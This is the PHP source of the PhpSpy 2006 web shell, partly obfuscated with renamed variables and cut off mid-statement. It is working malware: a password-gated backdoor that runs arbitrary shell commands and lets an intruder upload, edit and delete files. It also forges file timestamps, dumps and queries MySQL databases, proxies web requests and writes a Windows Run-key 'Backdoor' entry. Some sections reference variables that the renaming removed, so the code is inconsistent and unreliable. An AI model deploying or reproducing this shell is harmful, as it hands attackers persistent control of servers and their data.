<?php
echo '[syslog]01
'; error_reporting(7); ob_start(); $sp0e01a1 = explode(' ', microtime()); $spb73b62 = $sp0e01a1[1] + $sp0e01a1[0]; $spdbef11['check'] = '0'; $spdbef11['pass'] = 'angel'; $sp8a4b03 = function_exists('ini_get') ? ini_get('register_globals') : get_cfg_var('register_globals'); if ($sp8a4b03 != 1) { @extract($_POST, EXTR_SKIP); @extract($_GET, EXTR_SKIP); } echo '[syslog]02
'; $spf97504 = $_SERVER['PHP_SELF']; $spdf5b3d = 'true'; if ($spdbef11['check'] == '1') { if ($_GET['action'] == 'logout') { setcookie('adminpass', ''); echo '<meta http-equiv="refresh" content="3;URL=' . $spf97504 . '">'; echo '<span style="font-size: 12px; font-family: Verdana">ע���ɹ�......<p><a href="' . $spf97504 . '">������Զ��˳��򵥻������˳�������� &gt;&gt;&gt;</a></span>'; die; } if ($_POST['do'] == 'login') { $spd8b298 = trim($_POST['adminpass']); if ($spdbef11['pass'] == $spd8b298) { setcookie('adminpass', $spd8b298, time() + 1 * 24 * 3600); echo '<meta http-equiv="refresh" content="3;URL=' . $spf97504 . '">'; echo '<span style="font-size: 12px; font-family: Verdana">��½�ɹ�......<p><a href="' . $spf97504 . '">������Զ���ת�򵥻�������������� &gt;&gt;&gt;</a></span>'; die; } } if (isset($_COOKIE['adminpass'])) { if ($_COOKIE['adminpass'] != $spdbef11['pass']) { loginpage(); } } else { loginpage(); } } if (get_magic_quotes_gpc()) { $_GET = stripslashes_array($_GET); $_POST = stripslashes_array($_POST); } if ($_GET['action'] == 'phpinfo') { echo $spc3310d = !preg_match('phpinfo', $spdf5b3d) ? phpinfo() : 'phpinfo() �����ѱ�����,��鿴&lt;PHP��������&gt;'; die; } if (isset($_POST['url'])) { $sp9837a3 = @file_get_contents($_POST['url']); echo $sp9837a3 ? $sp9837a3 : '<body bgcolor="#F5F5F5" style="font-size: 12px;"><center><br><p><b>��ȡ URL ����ʧ��</b></p></center></body>'; die; } if (!empty($spb471bb)) { if (!@file_exists($spb471bb)) { echo '<script>alert(\'��Ҫ�µ��ļ�������!\')</script>'; } else { $sp387cde = basename($spb471bb); $sp23dc12 = explode('.', $sp387cde); $sp8052f8 = $sp23dc12[count($sp23dc12) - 1]; header('Content-type: application/x-' . $sp8052f8); header('Content-Disposition: attachment; filename=' . $sp387cde); header('Content-Description: PHP Generated Data'); header('Content-Length: ' . filesize($spb471bb)); @readfile($spb471bb); die; } } if ($_POST['backuptype'] == 'download') { @mysql_connect($spd750e1, $sp3d4c98, $sp26bfb3) or die('���ݿ�����ʧ��'); @mysql_select_db($sp21feae) or die('ѡ�����ݿ�ʧ��'); $sp023e76 = array_flip($_POST['table']); $sp3b8eaf = mysql_query('SHOW tables'); echo $sp3b8eaf ? NULL : '����: ' . mysql_error(); $sp387cde = basename($_SERVER['HTTP_HOST'] . '_MySQL.sql'); header('Content-type: application/unknown'); header('Content-Disposition: attachment; filename=' . $sp387cde); $sp875769 = ''; while ($sp0832f5 = mysql_fetch_array($sp3b8eaf)) { if (isset($sp023e76[$sp0832f5[0]])) { $sp875769 .= sqldumptable($sp0832f5[0]); $sp875769 .= $sp875769 . '
'; } } mysql_close(); die; } $spf14094 = str_replace('\\', '/', dirname(__FILE__)); if (!isset($sp8c9f8e) or empty($sp8c9f8e)) { $sp8c9f8e = '.'; $spbac9e7 = getPath($spf14094, $sp8c9f8e); } else { $sp8c9f8e = $_GET['dir']; $spbac9e7 = getPath($spf14094, $sp8c9f8e); } $spf681ed = dir_writeable($spbac9e7) ? '��д' : '����д'; $spc3310d = !preg_match('phpinfo', $spdf5b3d) ? ' | <a href="?action=phpinfo" target="_blank">PHPINFO()</a>' : ''; $spa83c28 = substr(PHP_OS, 0, 3) == 'WIN' ? ' | <a href="?action=reg">ע�������</a>' : ''; $spb97dac = new FORMS(); ?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>PhpSpy Ver 2006</title>
<style type="text/css">
body,td {
	font-family: "Tahoma";
	font-size: "12px";
	line-height: "150%";
}
.smlfont {
	font-family: "Tahoma";
	font-size: "11px";
}
.INPUT {
	FONT-SIZE: "12px";
	COLOR: "#000000";
	BACKGROUND-COLOR: "#FFFFFF";
	height: "18px";
	border: "1px solid #666666";
	padding-left: "2px";
}
.redfont {
	COLOR: "#A60000";
}
a:link,a:visited,a:active {
	color: "#000000";
	text-decoration: underline;
}
a:hover {
	color: "#465584";
	text-decoration: none;
}
.top {BACKGROUND-COLOR: "#CCCCCC"}
.firstalt {BACKGROUND-COLOR: "#EFEFEF"}
.secondalt {BACKGROUND-COLOR: "#F5F5F5"}
</style>
<SCRIPT language=JavaScript>
function CheckAll(form) {
	for (var i=0;i<form.elements.length;i++) {
		var e = form.elements[i];
		if (e.name != 'chkall')
		e.checked = form.chkall.checked;
    }
}
function really(d,f,m,t) {
	if (confirm(m)) {
		if (t == 1) {
			window.location.href='?dir='+d+'&deldir='+f;
		} else {
			window.location.href='?dir='+d+'&delfile='+f;
		}
	}
}
</SCRIPT>
</head>

<body style="table-layout:fixed; word-break:break-all">
<center>
<?php  $spb97dac->tableheader(); $spb97dac->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>' . $_SERVER['HTTP_HOST'] . '</b></td><td align="right"><b>' . $_SERVER['REMOTE_ADDR'] . '</b></td></tr></table>', 'center', 'top'); $spb97dac->tdbody('<a href="?action=logout">ע���Ự</a> | <a href="?action=dir">����PhpSpyĿ¼</a> | <a href="?action=phpenv">PHP��������</a> | <a href="?action=proxy">���ߴ���</a>' . $spa83c28 . $spc3310d . ' | <a href="?action=shell">WebShell</a> | <a href="?action=sql">SQL Query</a> | <a href="?action=sqlbak">MySQL Backup</a>'); $spb97dac->tablefooter(); ?>
<hr width="775" noshade>
<table width="775" border="0" cellpadding="0">
<?
$tb->headerform(array('method'=>'GET','content'=>'<p>����·��: '.$pathname.'<br>��ǰĿ¼('.$dir_writeable.','.substr(base_convert(@fileperms($nowpath),10,8),-4).'): '.$nowpath.'<br>��תĿ¼: '.$tb->makeinput('dir').' '.$tb->makeinput('','ȷ��','','submit').' ��֧�־���·�������·����'));

$tb->headerform(array('action'=>'?dir='.urlencode($dir),'enctype'=>'multipart/form-data','content'=>'�ϴ��ļ�����ǰĿ¼: '.$tb->makeinput('uploadfile','','','file').' '.$tb->makeinput('doupfile','ȷ��','','submit').$tb->makeinput('uploaddir',$dir,'','hidden')));

$tb->headerform(array('action'=>'?action=editfile&dir='.urlencode($dir),'content'=>'�½��ļ��ڵ�ǰĿ¼: '.$tb->makeinput('editfile').' '.$tb->makeinput('createfile','ȷ��','','submit')));

$tb->headerform(array('content'=>'�½�Ŀ¼�ڵ�ǰĿ¼: '.$tb->makeinput('newdirectory').' '.$tb->makeinput('createdirectory','ȷ��','','submit')));
?>
</table>
<hr width="775" noshade>
<?php  echo '<p><b>
'; if (!empty($sp74adec)) { if (file_exists($sp74adec)) { echo @unlink($sp74adec) ? $sp74adec . ' ɾ���ɹ�!' : '�ļ�ɾ��ʧ��!'; } else { echo basename($sp74adec) . ' �ļ��Ѳ�����!'; } } elseif (!empty($spe59e39)) { $sp060e36 = "{$sp8c9f8e}/{$spe59e39}"; if (!file_exists("{$sp060e36}")) { echo "{$spe59e39} Ŀ¼�Ѳ�����!"; } else { echo deltree($sp060e36) ? 'Ŀ¼ɾ���ɹ�!' : 'Ŀ¼ɾ��ʧ��!'; } } elseif ($sp5ae7b6 and !empty($_POST['newdirectory'])) { if (!empty($sp61d7a1)) { $sp59d5b6 = "{$sp8c9f8e}/{$sp61d7a1}"; if (file_exists("{$sp59d5b6}")) { echo '��Ŀ¼�Ѵ���!'; } else { echo @mkdir("{$sp59d5b6}", 511) ? '����Ŀ¼�ɹ�!' : '����ʧ��!'; @chmod("{$sp59d5b6}", 511); } } } elseif ($spc3c9ee) { echo @copy($_FILES['uploadfile']['tmp_name'], '' . $sp4d9037 . '/' . $_FILES['uploadfile']['name'] . '') ? '�ϴ��ɹ�!' : '�ϴ�ʧ��!'; } elseif ($_POST['do'] == 'doeditfile') { if (!empty($_POST['editfilename'])) { $sp387cde = "{$spcc8410}"; @($spe2e680 = fopen("{$sp387cde}", 'w')); echo $spa7f998 = @fwrite($spe2e680, $_POST['filecontent']) ? 'д���ļ��ɹ�!' : 'д��ʧ��!'; @fclose($spe2e680); } else { echo '��������Ҫ�༭���ļ���!'; } } elseif ($_POST['do'] == 'editfileperm') { if (!empty($_POST['fileperm'])) { $sp25cb5a = base_convert($_POST['fileperm'], 8, 10); echo @chmod($sp8c9f8e . '/' . $sp8f7201, $sp25cb5a) ? '�����޸ĳɹ�!' : '�޸�ʧ��!'; echo ' �ļ� ' . $sp8f7201 . ' �޸ĺ������Ϊ: ' . substr(base_convert(@fileperms($sp8c9f8e . '/' . $sp8f7201), 10, 8), -4); } else { echo '��������Ҫ���õ�����!'; } } elseif ($_POST['do'] == 'rename') { if (!empty($_POST['newname'])) { $sp723798 = $_POST['dir'] . '/' . $_POST['newname']; if (@file_exists($sp723798)) { echo '' . $_POST['newname'] . ' �Ѿ�����,����������һ��!'; } else { echo @rename($_POST['oldname'], $sp723798) ? basename($_POST['oldname']) . ' �ɹ�����Ϊ ' . $_POST['newname'] . ' !' : '�ļ����޸�ʧ��!'; } } else { echo '��������Ҫ�ĵ��ļ���!'; } } elseif ($_POST['do'] == 'domodtime') { if (!@file_exists($_POST['curfile'])) { echo 'Ҫ�޸ĵ��ļ�������!'; } else { if (!@file_exists($_POST['tarfile'])) { echo 'Ҫ���յ��ļ�������!'; } else { $spb523b8 = @filemtime($_POST['tarfile']); echo @touch($_POST['curfile'], $spb523b8, $spb523b8) ? basename($_POST['curfile']) . ' ���޸�ʱ��ɹ���Ϊ ' . date('Y-m-d H:i:s', $spb523b8) . ' !' : '�ļ����޸�ʱ���޸�ʧ��!'; } } } elseif ($_POST['do'] == 'modmytime') { if (!@file_exists($_POST['curfile'])) { echo 'Ҫ�޸ĵ��ļ�������!'; } else { $spf222b6 = $_POST['year']; $spa4ac52 = $_POST['month']; $sp8dce42 = $_POST['data']; $spce058a = $_POST['hour']; $spa662a9 = $_POST['minute']; $sp6819a9 = $_POST['second']; if (!empty($spf222b6) and !empty($spa4ac52) and !empty($sp8dce42) and !empty($spce058a) and !empty($spa662a9) and !empty($sp6819a9)) { $spb523b8 = strtotime("{$sp8dce42} {$spa4ac52} {$spf222b6} {$spce058a}:{$spa662a9}:{$sp6819a9}"); echo @touch($_POST['curfile'], $spb523b8, $spb523b8) ? basename($_POST['curfile']) . ' ���޸�ʱ��ɹ���Ϊ ' . date('Y-m-d H:i:s', $spb523b8) . ' !' : '�ļ����޸�ʱ���޸�ʧ��!'; } } } elseif ($sp9a403c) { if (@mysql_connect($spd750e1, $sp3d4c98, $sp26bfb3) and @mysql_select_db($sp21feae)) { echo '���ݿ����ӳɹ�!'; mysql_close(); } else { echo mysql_error(); } } elseif ($_POST['do'] == 'query') { @mysql_connect($spd750e1, $sp3d4c98, $sp26bfb3) or die('���ݿ�����ʧ��'); @mysql_select_db($sp21feae) or die('ѡ�����ݿ�ʧ��'); $sp3b8eaf = @mysql_query($_POST['sql_query']); echo $sp3b8eaf ? 'SQL���ɹ�ִ��!' : '����: ' . mysql_error(); mysql_close(); } elseif ($_POST['do'] == 'backupmysql') { if (empty($_POST['table']) or empty($_POST['backuptype'])) { echo '��ѡ�������ݵ����ݱ��ͱ��ݷ�ʽ!'; } else { if ($_POST['backuptype'] == 'server') { @mysql_connect($spd750e1, $sp3d4c98, $sp26bfb3) or die('���ݿ�����ʧ��'); @mysql_select_db($sp21feae) or die('ѡ�����ݿ�ʧ��'); $sp023e76 = array_flip($_POST['table']); $sp9f504b = @fopen($spebcd2c, 'w'); if ($sp9f504b) { $sp3b8eaf = mysql_query('SHOW tables'); echo $sp3b8eaf ? NULL : '����: ' . mysql_error(); while ($sp0832f5 = mysql_fetch_array($sp3b8eaf)) { if (isset($sp023e76[$sp0832f5[0]])) { sqldumptable($sp0832f5[0], $sp9f504b); fwrite($sp9f504b, '


'); } } fclose($sp9f504b); echo '���ݿ��ѳɹ����ݵ� <a href="' . $spebcd2c . '" target="_blank">' . $spebcd2c . '</a>'; mysql_close(); } else { echo '����ʧ��,��ȷ��Ŀ���ļ����Ƿ���п�дȨ��!'; } } } } elseif ($sp0aa333) { if (!empty($sp9fdbdd)) { $sp8afaac = ''; foreach ($sp9fdbdd as $sp1fd20d => $sp0945f4) { $sp8afaac .= $sp1fd20d . ','; } $sp8afaac = substr($sp8afaac, 0, strlen($sp8afaac) - 1); $sp9fdbdd = explode(',', $sp8afaac); $sp93799e = new PHPZip($sp9fdbdd); $sp4b0871 = $sp93799e->out; header('Content-type: application/octet-stream'); header('Accept-Ranges: bytes'); header('Accept-Length: ' . strlen($sp4b0871)); header('Content-Disposition: attachment;filename=' . $_SERVER['HTTP_HOST'] . '_Files.tar.gz'); echo $sp4b0871; die; } else { echo '��ѡ��Ҫ������ص��ļ�!'; } } elseif ($_POST['do'] == 'programrun' and !empty($_POST['program'])) { $sp62a453 = $spb05c40->ShellExecute($_POST['program'], $_POST['prog']); echo $sp62a453 == '0' ? '�����Ѿ��ɹ�ִ��!' : '��������ʧ��!'; } elseif ($_POST['do'] == 'viewphpvar' and !empty($_POST['phpvarname'])) { echo '���ò��� ' . $_POST['phpvarname'] . ' �����: ' . getphpcfg($_POST['phpvarname']) . ''; } elseif ($sp2585ba and !empty($_POST['readregname'])) { var_dump(@$spb05c40->RegRead($_POST['readregname'])); } elseif ($sp967444 and !empty($_POST['writeregname']) and !empty($_POST['regtype']) and !empty($_POST['regval'])) { $sp62a453 = @$spb05c40->RegWrite($_POST['writeregname'], $_POST['regval'], $_POST['regtype']); echo $sp62a453 == '0' ? 'д��ע�����ֵ�ɹ�!' : 'д�� ' . $_POST['regname'] . ', ' . $_POST['regval'] . ', ' . $_POST['regtype'] . ' ʧ��!'; } elseif ($sp0de60b and !empty($_POST['delregname'])) { $sp62a453 = @$spb05c40->RegDelete($_POST['delregname']); echo $sp62a453 == '0' ? 'ɾ��ע�����ֵ�ɹ�!' : 'ɾ�� ' . $_POST['delregname'] . ' ʧ��!'; } else { echo '�������� <a href="http://www.4ngel.net" target="_blank">Security Angel</a> С�� angel [<a href="http://www.bugkidz.org" target="_blank">BST</a>] ��������,���� <a href="http://www.4ngel.net" target="_blank">www.4ngel.net</a> �������°汾.'; } echo '</b></p>
'; if (!isset($_GET['action']) or empty($_GET['action']) or $_GET['action'] == 'dir') { $spb97dac->tableheader(); ?>
  <tr bgcolor="#cccccc">
    <td align="center" nowrap width="27%"><b>�ļ�</b></td>
	<td align="center" nowrap width="16%"><b>��������</b></td>
    <td align="center" nowrap width="16%"><b>����޸�</b></td>
    <td align="center" nowrap width="11%"><b>��С</b></td>
    <td align="center" nowrap width="6%"><b>����</b></td>
    <td align="center" nowrap width="24%"><b>����</b></td>
  </tr>
<?php  $sp7f35c2 = @opendir($sp8c9f8e); $spf67894 = '0'; while ($sp8f7201 = @readdir($sp7f35c2)) { $sp1fd20d = "{$sp8c9f8e}/{$sp8f7201}"; $sp62a453 = @is_dir($sp1fd20d); if ($sp62a453 == '1') { if ($sp8f7201 != '..' && $sp8f7201 != '.') { $sp940628 = @date('Y-m-d H:i:s', @filectime($sp1fd20d)); $sp0e01a1 = @date('Y-m-d H:i:s', @filemtime($sp1fd20d)); $sp4017fc = substr(base_convert(fileperms($sp1fd20d), 10, 8), -4); echo '<tr class=' . getrowbg() . '>
'; echo '  <td style="padding-left: 5px;">[<a href="?dir=' . urlencode($sp8c9f8e) . '/' . urlencode($sp8f7201) . "\"><font color=\"#006699\">{$sp8f7201}</font></a>]</td>\n"; echo "  <td align=\"center\" nowrap class=\"smlfont\">{$sp940628}</td>\n"; echo "  <td align=\"center\" nowrap class=\"smlfont\">{$sp0e01a1}</td>\n"; echo '  <td align="center" nowrap class="smlfont">&lt;dir&gt;</td>
'; echo '  <td align="center" nowrap class="smlfont"><a href="?action=fileperm&dir=' . urlencode($sp8c9f8e) . '&file=' . urlencode($sp8f7201) . "\">{$sp4017fc}</a></td>\n"; echo '  <td align="center" nowrap><a href="#" onclick="really(\'' . urlencode($sp8c9f8e) . '\',\'' . urlencode($sp8f7201) . "','��ȷ��Ҫɾ�� {$sp8f7201} Ŀ¼��? \\n\\n�����Ŀ¼�ǿ�,�˴β�������ɾ����Ŀ¼�µ������ļ�!','1')\">ɾ��</a></td>\n"; echo '</tr>
'; $spf67894++; } else { if ($sp8f7201 == '..') { echo '<tr class=' . getrowbg() . '>
'; echo '  <td nowrap colspan="6" style="padding-left: 5px;"><a href="?dir=' . urlencode($sp8c9f8e) . '/' . urlencode($sp8f7201) . '">�����ϼ�Ŀ¼</a></td>
'; echo '</tr>
'; } } } } @closedir($sp7f35c2); ?>
<tr bgcolor="#cccccc">
  <td colspan="6" height="5"></td>
</tr>
<FORM action="" method="POST">
<?
// �ļ��б�
$dirs=@opendir($dir);
$file_i = '0';
while ($file=@readdir($dirs)) {
	$filepath="$dir/$file";
	$a=@is_dir($filepath);
	if($a=="0"){		
		$size=@filesize($filepath);
		$size=$size/1024 ;
		$size= @number_format($size, 3);
		if (@filectime($filepath) == @filemtime($filepath)) {
			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
		} else {
			$ctime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filectime($filepath))."</span>";
			$mtime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filemtime($filepath))."</span>";
		}
		@$fileperm=substr(base_convert(@fileperms($filepath),10,8),-4);
		echo "<tr class=".getrowbg().">\n";
		echo "  <td style=\"padding-left: 5px;\">";
		echo "<INPUT type=checkbox value=1 name=dl[$filepath]>";
		echo "<a href=\"$filepath\" target=\"_blank\">$file</a></td>\n";
		echo "  <td align=\"center\" nowrap class=\"smlfont\">$ctime</td>\n";
		echo "  <td align=\"center\" nowrap class=\"smlfont\">$mtime</td>\n";
		echo "  <td align=\"right\" nowrap class=\"smlfont\"><span class=\"redfont\">$size</span> KB</td>\n";
		echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$fileperm</a></td>\n";
		echo "  <td align=\"center\" nowrap><a href=\"?downfile=".urlencode($filepath)."\">����</a> | <a href=\"?action=editfile&dir=".urlencode($dir)."&editfile=".urlencode($file)."\">�༭</a> | <a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($filepath)."','��ȷ��Ҫɾ�� $file �ļ���?','2')\">ɾ��</a> | <a href=\"?action=rename&dir=".urlencode($dir)."&fname=".urlencode($filepath)."\">����</a> | <a href=\"?action=newtime&dir=".urlencode($dir)."&file=".urlencode($filepath)."\">ʱ��</a></td>\n";
		echo "</tr>\n";
		$file_i++;
	}
}// while
@closedir($dirs); 
$tb->tdbody('<table width="100%" border="0" cellpadding="2" cellspacing="0" align="center"><tr><td>'.$tb->makeinput('chkall','on','onclick="CheckAll(this.form)"','checkbox','30','').' '.$tb->makeinput('downrar','ѡ���ļ��������','','submit').'</td><td align="right">'.$dir_i.' ��Ŀ¼ / '.$file_i.' ���ļ�</td></tr></table>','center',getrowbg(),'','','6');

echo "</FORM>\n";
echo "</table>\n";
}// end dir

elseif ($_GET['action'] == "editfile") {
	if(empty($newfile)) {
		$filename="$dir/$editfile";
		$fp=@fopen($filename,"r");
		$contents=@fread($fp, filesize($filename));
		@fclose($fp);
		$contents=htmlspecialchars($contents);
	}else{
		$editfile=$newfile;
		$filename = "$dir/$editfile";
	}
	$action = "?dir=".urlencode($dir)."&editfile=".$editfile;
	$tb->tableheader();
	$tb->formheader($action,'�½�/�༭�ļ�');
	$tb->tdbody('��ǰ�ļ�: '.$tb->makeinput('editfilename',$filename).' �������ļ����������ļ�');
	$tb->tdbody($tb->maketextarea('filecontent',$contents));
	$tb->makehidden('do','doeditfile');
	$tb->formfooter('1','30');
}//end editfile

elseif ($_GET['action'] == "rename") {
	$nowfile = (isset($_POST['newname'])) ? $_POST['newname'] : basename($_GET['fname']);
	$action = "?dir=".urlencode($dir)."&fname=".urlencode($fname);
	$tb->tableheader();
	$tb->formheader($action,'�޸��ļ���');
	$tb->makehidden('oldname',$dir."/".$nowfile);
	$tb->makehidden('dir',$dir);
	$tb->tdbody('��ǰ�ļ���: '.basename($nowfile));
	$tb->tdbody('����Ϊ: '.$tb->makeinput('newname'));
	$tb->makehidden('do','rename');
	$tb->formfooter('1','30');
}//end rename

elseif ($_GET['action'] == "fileperm") {
	$action = "?dir=".urlencode($dir)."&file=".$file;
	$tb->tableheader();
	$tb->formheader($action,'�޸��ļ�����');
	$tb->tdbody('�޸� '.$file.' ������Ϊ: '.$tb->makeinput('fileperm',substr(base_convert(fileperms($dir.'/'.$file),10,8),-4)));
	$tb->makehidden('file',$file);
	$tb->makehidden('dir',urlencode($dir));
	$tb->makehidden('do','editfileperm');
	$tb->formfooter('1','30');
}//end fileperm

elseif ($_GET['action'] == "newtime") {
	$action = "?dir=".urlencode($dir);
	$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);
	$tb->tableheader();
	$tb->formheader($action,'��¡�ļ�����޸�ʱ��');
	$tb->tdbody("�޸��ļ�: ".$tb->makeinput('curfile',$file,'readonly')." �� Ŀ���ļ�: ".$tb->makeinput('tarfile','��������·�����ļ���'),'center','2','30');
	$tb->makehidden('do','domodtime');
	$tb->formfooter('','30');
	$tb->formheader($action,'�Զ����ļ�����޸�ʱ��');
	$tb->tdbody('<br><ul><li>��Ч��ʱ������ͷ�Χ�ǴӸ�������ʱ�� 1901 �� 12 �� 13 �� ������ 20:45:54 �� 2038�� 1 �� 19 �� ���ڶ� 03:14:07<br>(�����ڸ��� 32 λ�з�����������Сֵ�����ֵ����)</li><li>˵��: ��ȡ 01 �� 30 ֮��, ʱȡ 0 �� 24 ֮��, �ֺ���ȡ 0 �� 60 ֮��!</li></ul>','left');
	$tb->tdbody('��ǰ�ļ���: '.$file);
	$tb->makehidden('curfile',$file);
	$tb->tdbody('�޸�Ϊ: '.$tb->makeinput('year','1984','','text','4').' �� '.$tb->makeselect(array('name'=>'month','option'=>$cachemonth,'selected'=>'October')).' �� '.$tb->makeinput('data','18','','text','2').' �� '.$tb->makeinput('hour','20','','text','2').' ʱ '.$tb->makeinput('minute','00','','text','2').' �� '.$tb->makeinput('second','00','','text','2').' ��','center','2','30');
	$tb->makehidden('do','modmytime');
	$tb->formfooter('1','30');
}//end newtime

elseif ($_GET['action'] == "shell") {
	$action = "??action=shell&dir=".urlencode($dir);
	$tb->tableheader();
	$tb->tdheader('WebShell Mode');

	if (substr(PHP_OS, 0, 3) == 'WIN') {
		$program = isset($_POST['program']) ? $_POST['program'] : "c:\winnt\system32\cmd.exe";
		$prog = isset($_POST['prog']) ? $_POST['prog'] : "/c net start > ".$pathname."/log.txt";
		echo "<form action=\"?action=shell&dir=".urlencode($dir)."\" method=\"POST\">\n";
		$tb->tdbody('�޻������г��� �� �ļ�: '.$tb->makeinput('program',$program).' ����: '.$tb->makeinput('prog',$prog,'','text','40').' '.$tb->makeinput('','Run','','submit'),'center','2','35');
		$tb->makehidden('do','programrun');
		echo "</form>\n";
	}

	echo "<form action=\"?action=shell&dir=".urlencode($dir)."\" method=\"POST\">\n";
	$tb->tdbody('��ʾ:�������������ȫ,�����������д���ļ�.�������Եõ�ȫ������.');
	
	$execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','wscript'=>'Wscript.Shell') : array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen');

	$tb->tdbody('ѡ��ִ�к���: '.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs,'selected'=>$execfunc)).' ��������: '.$tb->makeinput('command',$_POST['command'],'','text','60').' '.$tb->makeinput('','Run','','submit'));
?>
  <tr class="secondalt">
    <td align="center"><textarea name="textarea" cols="100" rows="25" readonly><?php  if (!empty($_POST['command'])) { if ($sp0e05cf == 'system') { system($_POST['command']); } elseif ($sp0e05cf == 'passthru') { passthru($_POST['command']); } elseif ($sp0e05cf == 'exec') { $sp3b8eaf = exec($_POST['command']); echo $sp3b8eaf; } elseif ($sp0e05cf == 'shell_exec') { $sp3b8eaf = shell_exec($_POST['command']); echo $sp3b8eaf; } elseif ($sp0e05cf == 'popen') { $sp811948 = popen($_POST['command'], 'r'); $sp72b3c7 = fread($sp811948, 2096); echo $sp72b3c7; pclose($sp811948); } elseif ($sp0e05cf == 'wscript') { $sp876f0b = new COM('W' . 'Scr' . 'ip' . 't.she' . 'll') or die('PHP Create COM WSHSHELL failed'); $spd78f94 = $sp876f0b->exec('cm' . 'd.e' . 'xe /c ' . $_POST['command'] . ''); $sp865139 = $spd78f94->StdOut(); $sp1d0ec1 = $sp865139->ReadAll(); echo $sp1d0ec1; } else { system($_POST['command']); } } ?>
</textarea></td>
  </tr>  
  </form>
</table>
<?php  echo '[syslog]03
'; } elseif ($_GET['action'] == 'reg') { $sp581fdf = '?action=reg'; $sp3c8441 = isset($_POST['regname']) ? $_POST['regname'] : 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp\\PortNumber'; $spf9b1a8 = isset($_POST['registre']) ? $_POST['registre'] : 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor'; $sp762fa2 = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe'; $spc0a957 = $_POST['delregname']; $spb97dac->tableheader(); $spb97dac->formheader($sp581fdf, '��ȡע���'); $spb97dac->tdbody('��ֵ: ' . $spb97dac->makeinput('readregname', $sp3c8441, '', 'text', '100') . ' ' . $spb97dac->makeinput('regread', '��ȡ', '', 'submit'), 'center', '2', '50'); echo '</form>'; $spb97dac->formheader($sp581fdf, 'д��ע���'); $spb1d5f7 = array('REG_SZ' => 'REG_SZ', 'REG_BINARY' => 'REG_BINARY', 'REG_DWORD' => 'REG_DWORD', 'REG_MULTI_SZ' => 'REG_MULTI_SZ', 'REG_EXPAND_SZ' => 'REG_EXPAND_SZ'); $spb97dac->tdbody('��ֵ: ' . $spb97dac->makeinput('writeregname', $spf9b1a8, '', 'text', '56') . ' ����: ' . $spb97dac->makeselect(array('name' => 'regtype', 'option' => $spb1d5f7, 'selected' => $sp2d90dd)) . ' ֵ:  ' . $spb97dac->makeinput('regval', $sp762fa2, '', 'text', '15') . ' ' . $spb97dac->makeinput('regwrite', 'д��', '', 'submit'), 'center', '2', '50'); echo '</form>'; $spb97dac->formheader($sp581fdf, 'ɾ��ע���'); $spb97dac->tdbody('��ֵ: ' . $spb97dac->makeinput('delregname', $spc0a957, '', 'text', '100') . ' ' . $spb97dac->makeinput('regdelete', 'ɾ��', '', 'submit'), 'center', '2', '50'); echo '</form>'; $spb97dac->tablefooter(); } elseif ($_GET['action'] == 'proxy') { $sp581fdf = '?action=proxy'; $spb97dac->tableheader(); $spb97dac->formheader($sp581fdf, '���ߴ���', 'proxyframe'); $spb97dac->tdbody('<br><ul><li>�ñ����ܽ�ʵ�ּ򵥵� HTTP ����,������ʾʹ�����·����ͼƬ�����Ӽ�CSS��ʽ��.</li><li>�ñ����ܿ���ͨ�������������Ŀ��URL,����֧�� SQL Injection ̽���Լ�ĳЩ�����ַ�.</li><li>�ñ���������� URL,��Ŀ�����������µ�IP��¼�� : ' . $_SERVER['REMOTE_ADDR'] . '</li></ul>', 'left'); $spb97dac->tdbody('URL: ' . $spb97dac->makeinput('url', 'http://www.4ngel.net', '', 'text', '100') . ' ' . $spb97dac->makeinput('', '���', '', 'submit'), 'center', '1', '40'); $spb97dac->tdbody('<iframe name="proxyframe" frameborder="0" width="765" height="400" marginheight="0" marginwidth="0" scrolling="auto" src="http://www.4ngel.net"></iframe>'); echo '</form>'; $spb97dac->tablefooter(); } elseif ($_GET['action'] == 'sql') { $sp581fdf = '?action=sql'; $spd750e1 = isset($_POST['servername']) ? $_POST['servername'] : 'localhost'; $sp3d4c98 = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root'; $sp26bfb3 = $_POST['dbpassword']; $sp21feae = $_POST['dbname']; $sp3d25fd = $_POST['sql_query']; $spb97dac->tableheader(); $spb97dac->formheader($sp581fdf, 'ִ�� SQL ���'); $spb97dac->tdbody('Host: ' . $spb97dac->makeinput('servername', $spd750e1, '', 'text', '20') . ' User: ' . $spb97dac->makeinput('dbusername', $sp3d4c98, '', 'text', '15') . ' Pass: ' . $spb97dac->makeinput('dbpassword', $sp26bfb3, '', 'text', '15') . ' DB: ' . $spb97dac->makeinput('dbname', $sp21feae, '', 'text', '15') . ' ' . $spb97dac->makeinput('connect', '����', '', 'submit')); $spb97dac->tdbody($spb97dac->maketextarea('sql_query', $sp3d25fd, '85', '10')); $spb97dac->makehidden('do', 'query'); $spb97dac->formfooter('1', '30'); } elseif ($_GET['action'] == 'sqlbak') { $sp581fdf = '?action=sqlbak'; $spd750e1 = isset($_POST['servername']) ? $_POST['servername'] : 'localhost'; $sp3d4c98 = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root'; $sp26bfb3 = $_POST['dbpassword']; $sp21feae = $_POST['dbname']; $spb97dac->tableheader(); $spb97dac->formheader($sp581fdf, '���� MySQL ���ݿ�'); $spb97dac->tdbody('Host: ' . 